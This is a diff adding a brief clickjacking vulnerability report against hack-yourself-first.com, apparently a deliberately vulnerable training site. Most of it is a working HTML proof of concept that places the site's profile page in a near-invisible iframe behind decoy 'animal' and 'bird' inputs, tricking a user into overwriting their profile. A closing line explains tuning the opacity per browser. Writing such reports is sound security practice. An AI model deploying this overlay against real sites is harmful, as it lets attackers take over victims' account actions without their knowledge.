@@ -1,0 +1,81 @@
+Summary: Using clickjacking vulnerability to change the user's profile
+Steps to reproduce: Create an account and go to edit profile. Then create a HTML file as follows below (Clickjacking PoC) and run the file. Then enter the details as follows and reload the edit profile page in hack-yourself-first website. Then you can see that what you written previously in the HTML file which you created.
+Impact: Due to this bug, an attacker can change the profile of victim believing.
+
+Clickjacking PoC: 
+
+<!DOCTYPE html>
+<html>
+<head>
+<title>Clickjacking to change username</title>
+</head>
+
+<body>
+
+<style>
+    iframe {
+        position:relative;
+        width:700px;
+        height: 500px;
+        opacity: 0.00001;
+        z-index: 2;
+    }
+    .ok {
+        position:absolute;
+        top:310px;
+        left:220px;
+        z-index: 1;
+    }
+    
+    .animal { 
+        position:absolute;
+        top:210px;
+        left:30px;
+        z-index: 1;
+    }
+    
+       .bird { 
+        position:absolute;
+        top:260px;
+        left:50px;
+        z-index: 1;
+    }
+    
+    .input1 { 
+        position:absolute;
+        top:205px;
+        left:210px;
+        z-index: 1;
+    }
+    
+      .input2 { 
+        position:absolute;
+        top:255px;
+        left:210px;
+        z-index: 1;
+    }
+    
+    .delete { 
+        position:absolute;
+        top: 20px;
+        left:50px;
+        z-index: 1;
+    }
+  
+    
+</style>
+<div class="animal">Enter a animal name:</div>
+<div class="bird">Enter a bird name:</div>
+<div class="ok">Ok</div>
+<h4 class="delete">Press "Ctrl+A" and "Del" before typing</h4>
+<input type="text" class="input1"></input>
+<input type="text" class="input2"></input>
+<iframe src="https://hack-yourself-first.com/Account/UserProfile/333"></iframe>
+
+</body>
+</html>
+
+
+note: this works in firefox without any issue, if you are using anyother browser, then you have to increase the opacity of iframe and adjust it according to it.
+
+
